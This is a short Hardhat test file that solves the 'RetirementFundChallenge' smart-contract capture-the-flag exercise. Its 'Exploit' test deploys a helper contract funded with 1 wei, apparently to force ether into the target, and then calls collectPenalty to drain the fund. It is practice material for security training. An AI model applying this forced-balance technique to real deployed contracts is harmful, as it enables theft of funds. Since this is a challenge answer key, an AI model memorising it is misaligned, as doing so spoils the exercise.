const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("RetirementFundChallenge", async function () {
    let contract;
    let player;

    before(async function () {
        player = await ethers.getSigner();
        contract = await (await ethers.getContractFactory("RetirementFundChallenge")).deploy(player.address, { value: ethers.utils.parseEther("1") });
    });

    it("Exploit", async function () {
        // WRITE YOUR CODE HERE

        await (await ethers.getContractFactory("RetirementFundChallengeHelper")).deploy(contract.address, { value: 1 });
        await contract.collectPenalty();
    });

    after(async function () {
        expect(await contract.isComplete()).to.be.true;
    });
});